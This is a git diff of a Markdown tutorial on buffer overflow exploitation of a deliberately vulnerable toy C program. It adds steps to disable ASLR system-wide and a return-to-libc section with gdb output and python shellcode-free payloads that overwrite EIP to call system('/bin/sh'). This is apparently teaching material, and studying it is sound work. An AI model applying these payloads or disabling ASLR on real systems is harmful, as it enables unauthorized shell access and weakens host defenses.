@@ -3,8 +3,11 @@
 sources:
 https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
 https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
-https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 
-https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux
+https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 \
+https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux \
+https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization \
+https://en.wikipedia.org/wiki/Address_space_layout_randomization \
+https://www.ret2rop.com/2018/08/return-to-libc.html
 
 When a function is called, a return address is saved in the stack so the
 program knows where to take instructions from after the function exits, by
@@ -75,7 +78,7 @@ to bypass the defenses they disable.
 
 ### The Compilation
 
-We will compile using
+We will compile using ASLR disabled (explained below)
 `gcc rip.c -m32 -no-pie -fno-stack-protector -o rip`:
 
 * `-m32` - compile to 32 bits. The code will still run on 64 bit
@@ -87,16 +90,37 @@ usually don't contain null bytes, which we can't write to an string.
 is position-independent the OS usually puts it in a random location in
 memory. We will first execute the program to discover relevant
 addresses and then execute again to use them, and without this flag
-the addresses would be different between executions.
+the addresses would be different between executions. Without ASLR, the
+heap and libraries could still have random addresses.
 
 * `-fno-stack-protector` - disables canary. Canary is a defense technique
 against buffer overflow that basically puts a random value in the stack
 and check if it changes at some point. If it does is because a buffer
 overflow overwrote it and the program is terminated.
 
-* `-o` what comes after this flag will be the name of our executable.
+* `-o` - what comes after this flag will be the name of our executable.
 
-Or you can just use the `Makefile`'s  `first` rule with `make first`.
+* Disable ASLR - ASLR stands for Address Space Layout Randomization,
+and it is responsible for randomly arranging the address space
+for the stack, heap and libraries. Without `-no-pie` everything would
+be mapped to the same place, but the binary itself would store offsets
+instead of addresses, which would become addresses when the program is
+called. To disable ASLR:
+
+```
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+The ASLR is automatically restore on reboot, but you can also do it
+manually:
+
+```
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+Or you can just use the `Makefile`'s  `first` rule with `make first`,
+just mind that it doesn't disable ASLR, for that please follow the
+instructions above.
 
 ### Plan of Attack
 
@@ -185,83 +209,97 @@ order is backwards. Yours is probably too (most are nowadays)
 Running any of the above commands (with the proper addresses)
 should grant you a shell!
 
-### Getting Shell in Other Scenarios
+### Getting Shell in the Wild
 
 Although we managed to get the shell, our methodology could be improved
 to work in other scenarios.
 
-* What if `impossible_shell` was a more complex function?
+1. What if `impossible_shell` was a more complex function?
 
-* What if `system` called "/bin/cal" instead?
+2. What if `system` called "/bin/cal" instead?
 
-* What if `system` wasn't called at all?
+3. What if `system` wasn't called at all?
 
-#### What if: `impossible_shell` was a more complex function
+The answer: Return to `libc`.
 
-Why are calling `impossible_shell` in the first place? The answer:
-to call `system`. However, we could cut the middleman here and go
-directly to `system`! For that we can just point EIP directly to
-the instruction that calls `system`:
+`libc`, the C standard library is the one used for functions like
+`printf`, `scanf`, `system` and many more.
+
+Why this help us? When a library is loaded, it is *entirely* loaded.
+This means that even if a program uses only `printf`, the entire
+libc is accessed by the program.
+
+If we can get a shell using only libc, this means we can get a
+shell in most C programs with a buffer overflow vulnerability.
+
+So, this is how we are going to answer:
+
+1. Doesn't matter, let's just call `system` directly from `libc`!
+
+2. There is a "/bin/sh" string in `libc`, let's just use it
+instead!
+
+3. Doesn't matter either! We can also call `system` from `libc`!
+
+Of course, although our current setup makes this easier, we will
+see how far we can go with the barriers we disabled afterwards.
+
+To get the addresses from `libc` we need to run the program in
+`gdb` and break at some point.
 
 ```
-80484b8:	e8 a3 fe ff ff       	call   8048360 <system@plt>
+(gdb) break main
+Breakpoint 1 at 0x804851e
+(gdb) run 
+Breakpoint 1, 0x0804851e in main ()
+(gdb)
 ```
 
-But doing so yields:
+Now `libc` is loaded and we can get relevant info from it. To
+get the `system` address type:
 
 ```
-./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08')"`
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e36850 <system>
+```
+
+And type that value where the `impossible_shell` address was before:
+
+```
+./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7')"`
+sh: 1: ��������: not found
 Segmentation fault
 ```
 
-Why that didn't work? Well, we may be calling `system` but we aren't
-passing any arguments to it! Just like we saw before with the buffer
-we are overflowing and the `strcmp` and `strcpy` functions, the
-strings taken as argument is pushed to the stack before the function
-call.
+Well, that didn't work! We forgot to pass an argument to `system`.
+Previously, `impossible_shell` pushed the address of "/bin/sh",
+but now we are the ones doing the heavy-lifting.
 
-When we call `impossible_shell` it pushes EBP to the stack ('BBBB') and
-then the argument to `system`, "/bin/sh". Since we are going directly
-to `system`, we are the ones responsible for the heavy-lifting.
-
-When `password_is_correct` calls `leave` and `ret` at the end of the
-excution, it pops 'BBBB' and the address that comes after it. So all
-we need to do is add the arguments that will be given to the `system`
-call:
+Let's take a look at our current payload:
 
 ```
-./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'bin/sh address')"`
+b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + 'garbage value1' + 'garbage value2'
 ```
 
-Since "/bin/sh" is a string literal it should be in the `.rodata`
-section, destined to readonly data. We can get to which address
-this section gets mapped to with `readelf --sections rip`:
+`b'A'*0x18` is just so we can fill the stack and overwrite the actual
+important stuff, just like `b'BBBB'`. When `password_is_correct` ends its
+execution, `b'\x50\x68\xe3\xf7'` get written to EIP, ESP points to
+'garbage value1' and `impossible_shell` is called. In `impossible_shell`,
+EBP is pushed to stack. Are you following? At this point we are in the
+`impossible_shell` and the stack looks like this:
+
+Higher Addresses (Bottom of the stack) |
+---------------------------------------|
+garbage value2 (argument) |
+garbage value1 (return address) |
+saved EBP (pushed `impossible_shell`) |
+Lower Addresses (Top of the stack) |
+
+As you can see, if we write the address of "/bin/sh" to 'garbage value2'
+it will be used as an argument to `system`:
 
 ```
-[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
-[16] .rodata           PROGBITS        08048618 000618 00008c 00   A  0   0  4
+./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'CCCC' + b'\xc8\x97\xf5\xf7')"`
 ```
 
-As you can see, in my case the address is `0x08048618`. The "/bin/sh"
-should be somewhere inside this section. With `readelf -p .rodata rip`
-we can see the contents of the section and their offset from the
-start of the section:
-
-```
-  [     8]  /bin/sh
-  [    10]  passwd1
-  [    18]  PASSWORD IS CORRECT!
-  [    30]  i don't feel like giving you a shell though�
-  [    60]  PASSWORD IS INCORRECT!
-  [    77]  try harder next time
-```
-
-"/bin/sh" start 8 bytes after `0x08048618`, so `0x08048620` is
-the value to put in the payload:
-
-```
-./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'\x20\x86\x04\x08')"`
-$
-```
-
-
+## Dealing With a 0x00 in the Addresses
